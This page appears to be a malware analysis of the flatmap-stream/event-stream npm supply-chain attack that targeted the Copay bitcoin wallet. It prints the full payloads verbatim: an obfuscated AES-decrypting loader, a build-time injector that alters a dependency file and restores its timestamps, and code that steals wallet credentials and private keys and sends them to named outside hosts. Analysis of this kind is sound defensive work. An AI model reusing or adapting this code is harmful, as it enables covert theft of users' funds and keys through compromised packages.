---
layout: default
title:  "Attack Payloads"
description: "An in-depth look at the attack payloads"
---

### Payload A

[This](https://raw.githubusercontent.com/andromeda/e-s/master/source/flatmap-stream%400.1.0_index.min.js?token=AN3TTKWZEDLTHZ7GXYICZZC6DDSJA) is what the raw (and minified) source code of flatmap-stream 0.1.0 looks like.
And [this](https://raw.githubusercontent.com/andromeda/e-s/master/source/flatmap-stream%400.1.1_index.min.js?token=AN3TTKUZWMFTECARDHVSSVK6DDSJG) is what the raw (and minified) source code of flatmap-stream 0.1.1 .
It is easily distinguishable that some lines of code have been added to the end of the file on version 0.1.1 . This is the code for Payload A - the bootstrap. It acts as an enabler for the remaining two payloads. Here is the code of the payload beautified (deminified):
```javascript
! function() {
  try {
      var r = require,
          t = process;

      function e(r) {
          return Buffer.from(r, "hex").toString()
      }
      var n = r(e("2e2f746573742f64617461")),
          o = t[e(n[3])][e(n[4])];
      if (!o) return;
      var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
          a = u.update(n[0], e(n[8]), e(n[9]));
      a += u.final(e(n[9]));
      var f = new module.constructor;
      f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1])
  } catch (r) {}
}();
```
It is still not particularly easy to read (and that is no accident). These changes have been made to the following code to make it far more accessible:
* Function e() has been renamed to unhex, as it converts a hexadecimal string to text
* The try catch statement has been removed
* The function "container" has been removed
```javascript
function unhex(r) {
          return Buffer.from(r, "hex").toString()
      }
      
var n = require(unhex("2e2f746573742f64617461"));
var o = process[unhex(n[3])][unhex(n[4])];

if (!o) return;

var u = require(unhex(n[2]))[unhex(n[6])](unhex(n[5]), o);
var a = u.update(n[0], unhex(n[8]), unhex(n[9]));

a += u.final(unhex(n[9]));

var f = new module.constructor;

f.paths = module.paths, f[unhex(n[7])](a, ""), f.exports(n[1])
```
This piece of code still doesn't make much sense. That is, because it is incomplete. Let's take a look at the fourth line:
```javascript
var n = require(unhex("2e2f746573742f64617461"));
```
If we unhex the string we get "./test/data", so that line of code becomes
```javascript
var n = require("./test/data");
```
To proceed, we need to find out what this auxillary data file contains. It contains strings in hexadecimal format. The first two (large) strings unhex to binary data that requires further decryption. The rest of the strings unhex to readable keywords. The comments on the following code indicate what they unhex to. This is it:
```javascript
module.exports = [
  "",
  "",
  "63727970746f", //crypto
  "656e76", // env
  "6e706d5f7061636b6167655f6465736372697074696f6e", //npm_package_description
  "616573323536", //aes256
  "6372656174654465636970686572", //createDecipher
  "5f636f6d70696c65", //_compile
  "686578", //hex
  "75746638" //utf8
]; 
```
It makes perfect sense that the creator of this code would want it obfuscated. Not only is it very suspicious, but flatmap-stream shouldn't include such references in the first place, making it even more conspicuous. In the following file, a number of changes have been made:
* File refences have been replaced with literal strings (from the file)
* Variables have been renamed to be more descriptive of the data they store
* Final line of the previous iteration of the code has been broken into three for readability
* unhex function omitted (everything's been replaced)
```javascript
var testData = require("./test/data");
var desc = process.env.npm_package_description;

var decipher = require("crypto").createDecipher("aes256", desc);
var text = decipher.update(testData[0], "hex", "utf8");

text += decipher.final("utf8");

var newModule = new module.constructor();

newModule.paths = module.paths;
newModule._compile(text, "");
newModule.exports(testData[1]);
```
Let us now walk through what the finilized version of the payload does:

1. The code requires data from an external file (data)
2. It also gets from the environment the description of the package
3. Using the package description it creates a decipher instance
4. It then uses the decipher instance to... decipher the first line (binary data) from the file
5. Lastly, a new module is created with the decrypted data from the file as it source, the second line from the file is exported from that module.

Quickly we can see that in order for this script to work a specific npm package's description. This is one of the elements that makes this attack so highly targeted. On the other hand it limits the damage as an immense amount of packages depended on event-stream but only one was targeted. The key to the decipher instance was 'A Secure Bitcoin Wallet' (copay-dash@2.4.0). How it was discovered is beyond our scope (or we'll go through later). The encrypted code is also resistant to static analysis, avoiding detection by such tools.

### Payload B
Now this is what the new module looks like:
```javascript
/*@@*/
module.exports = function(e) {
  try {
      if (!/build\:.*\-release/.test(process.argv[2])) return;
      var t = process.env.npm_package_description,
          r = require("fs"),
          i = "./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js",
          n = r.statSync(i),
          c = r.readFileSync(i, "utf8"),
          o = require("crypto").createDecipher("aes256", t),
          s = o.update(e, "hex", "utf8");
      s = "\n" + (s += o.final("utf8"));
      var a = c.indexOf("\n/*@@*/");
      0 <= a && (c = c.substr(0, a)), r.writeFileSync(i, c + s, "utf8"), r.utimesSync(i, n.atime, n.mtime), process.on("exit", function() {
          try {
              r.writeFileSync(i, c, "utf8"), r.utimesSync(i, n.atime, n.mtime)
          } catch (e) {}
      })
  } catch (e) {}
};
```
This payload acts as the injector. It bears some similarities to the first module. Notice that it is not obfuscated, but what it does might not be obvious during our _prima vista_. Let's go through what it does, starting with the following line: 
```javascript
if (!/build\:.*\-release/.test(process.argv[2])) return;
```
The script is being run by a command in this format:
```
npm run-script script-name
```
From that we can deduce that "script-name" is being tested to start with "build:" and end with "-release" according to ___ .
By examining copay's package.json we can deduce why that is:
```javascript
"build:ios-release": "npm run env:prod && ionic cordova build ios --release --aot true --environment prod --output-hashing all --sourcemaps false --extract-css true --named-chunks false --build-optimizer true",
"build:android-release": "npm run env:prod && ionic cordova build android --release --aot true --environment prod --output-hashing all --sourcemaps false --extract-css true --named-chunks false --build-optimizer true",
"build:desktop-release": "npm run env:desktop && node --max-old-space-size=8192 ./node_modules/@ionic/app-scripts/bin/ionic-app-scripts.js build --prod",
```
These scripts are in charge of building the iOS, Android and desktop applications of copay. These are the versions that are being targeted, all run on end user's devices. 

The code will be injected to a file ReedSolomonDecoder.js from a submodule ([ZXing](https://www.npmjs.com/package/@zxing/library)). This is not a malicious dependency. However this file is accessed in the context that the malicious script is intented to be run in. If the file has not been modified, payload b does nothing. If it does, '/*@@*/' appears in the file and payload c is injected into the file, awaiting execution. After (and if) the injection occurs, payload b replaces the files metadata (modified/accessed timestamps) so that it appears the file had not been changed.

### Payload C

Following the execution of the previous two payloads, the final one has been injected to reedsolomondecoder.js silently awaiting execution. This is the injected code:
```javascript
/*@@*/
! function() {
  function e() {
      try {
          var o = require("http"),
              a = require("crypto"),
              c = "-----BEGIN PUBLIC KEY-----\\n2wIDAQAB\n-----END PUBLIC KEY-----";

          function i(e, t, n) {                           //sendrequest
              e = Buffer.from(e, "hex").toString();
              var r = o.request({
                  hostname: e,
                  port: 8080,
                  method: "POST",
                  path: "/" + t,
                  headers: {
                      "Content-Length": n.length,
                      "Content-Type": "text/html"
                  }
              }, function() {});
              r.on("error", function(e) {}), r.write(n), r.end()
          }

          function r(e, t) {                          //requestprep
              for (var n = "", r = 0; r < t.length; r += 200) {
                  var o = t.substr(r, 200);
                  n += a.publicEncrypt(c, Buffer.from(o, "utf8")).toString("hex") + "+"
              }
              i("636f7061796170692e686f7374", e, n), i("3131312e39302e3135312e313334", e, n)
          }

          function l(t, n) {                          //getFromStorage
              if (window.cordova) try {
                  var e = cordova.file.dataDirectory;
                  resolveLocalFileSystemURL(e, function(e) {
                      e.getFile(t, {
                          create: !1
                      }, function(e) {
                          e.file(function(e) {
                              var t = new FileReader;
                              t.onloadend = function() {
                                  return n(JSON.parse(t.result))
                              }, t.onerror = function(e) {
                                  t.abort()
                              }, t.readAsText(e)
                          })
                      })
                  })
              } catch (e) {} else {
                  try {
                      var r = localStorage.getItem(t);
                      if (r) return n(JSON.parse(r))
                  } catch (e) {}
                  try {
                      chrome.storage.local.get(t, function(e) {
                          if (e) return n(JSON.parse(e[t]))
                      })
                  } catch (e) {}
              }
          }
          global.CSSMap = {}, l("profile", function(e) {            //callback1
              for (var t in e.credentials) {
                  var n = e.credentials[t];
                  "livenet" == n.network && l("balanceCache-" + n.walletId, function(e) {
                      var t = this;
                      t.balance = parseFloat(e.balance.split(" ")[0]), "btc" == t.coin && t.balance < 100 || "bch" == t.coin && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, r("c", JSON.stringify(t)))
                  }.bind(n))
              }
          });
          var e = require("bitcore-wallet-client/lib/credentials.js");
          e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {
              var t = this.getKeysFunc(e);
              try {
                  global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], r("p", e + "\t" + this.xPubKey))
              } catch (e) {}
              return t
          }
      } catch (e) {}
  }
  window.cordova ? document.addEventListener("deviceready", e) : e()
}();
```
To study this paylaod, its best that we focus on the specific functions defined and used. 
* Following declarations and requirements function "i" follows. A more descriptive name for it would be "sendRequest". What it does is take as arguments an ip address in hex format, a path and a payload. It then sends the payload to the host inputted (after unhexing it) on the specified path.
* The next function, "r", which we'll call "requestPrep" as it prepares the payload to be sent by "sendRequest". The payload converted to utf8 string and encrypted using the public key that was initially included and then converted to hex. Finally, using "sendRequest" the payload is sent to "copayapi.host" and 111.90.151.134 which is a collection service based in Kuala Lumpur, Malaysia (these are the addresses the hex strings unhex to).
* Moving on, we get to function "l", which we'll dub "getFromStorage". The name is descriptive of the function as it stores the contents of a file (provided via the arguments) and then parses it to a callback function. It consists of file system calls both on the cordova environment for mobile as well as for the desktop application.

There are two more nested callback functions defined in the remaining code.
* The first one, "callback11", ensures that the script runs on the live version of the bitcoin network, labeled as "livenet" as opposed to a, say, test network, labeled "testnet". It does this by going through the credentials in the "profile" file.
* The second, nested callback function "callback2" accesses the file "balancheCache" which contains the users balance. It checks if that balance exceeds 100 bitcoin or 1000 bitcoin cash, and in case it does, it sets a global variable to true in order to mark. Note that the user's credentials are plundered regardless if the balance requirements are met.

The last section of code intercepts and fake patches the getKeys function from the Credentials class. The patched version of it, reproduces the functions original result but it also checks the variable (which is essentially a hash table) used previously to flag each key. If it comes up positive, the variable is deleted to remove remaining traces and the users private keys are transmitted using the "requestPrep" function. Lastly, on the last line, there's an if statement responsible for launching the script as soon as the device is ready (on mobile versions) or instantly (desktop).

